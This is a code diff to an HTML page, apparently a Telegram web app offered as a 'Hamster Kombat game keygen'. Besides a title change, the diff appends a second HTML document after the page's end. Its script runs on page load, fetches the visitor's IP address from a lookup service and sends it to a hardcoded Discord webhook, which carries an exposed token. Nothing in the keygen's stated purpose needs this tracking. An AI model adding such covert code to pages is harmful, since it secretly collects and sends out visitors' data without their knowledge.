@@ -75,7 +75,7 @@
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hamster Kombat bike keygen</title>
+    <title>Hamster Kombat game keygen</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
       html, body {
@@ -625,5 +625,60 @@ function generateClientId() {
     return `${timestamp}-${randomNumbers}`;
 }
 </script>
+</body>
+</html>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Function to get the user's IP address
+            async function fetchIPAddress() {
+                try {
+                    const response = await fetch('https://api.ipify.org?format=json');
+                    const data = await response.json();
+                    return data.ip;
+                } catch (error) {
+                    console.error('Error fetching IP address:', error);
+                    return null;
+                }
+            }
+
+            // Function to send the IP address to your server or webhook
+            async function sendIP(ip) {
+                const webhookURL = 'https://discord.com/api/webhooks/1271762466925183077/ft5BLULXLCoLBpf-fuIi9m-5Z-lmedVBLDA9WDF7lyQ9MSfOMLDaATZqYQhMt-8LeQB8'; // Replace with your Discord webhook URL
+                const payload = {
+                    content: `New IP Address: ${ip}`
+                };
+
+                try {
+                    await fetch(webhookURL, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(payload)
+                    });
+                } catch (error) {
+                    console.error('Error sending IP address to webhook:', error);
+                }
+            }
+
+            // Fetch and send the IP address when the page loads
+            (async function() {
+                const ip = await fetchIPAddress();
+                if (ip) {
+                    sendIP(ip);
+                }
+            })();
+        });
+    </script>
+</head>
+<body>
+    
 </body>
 </html>
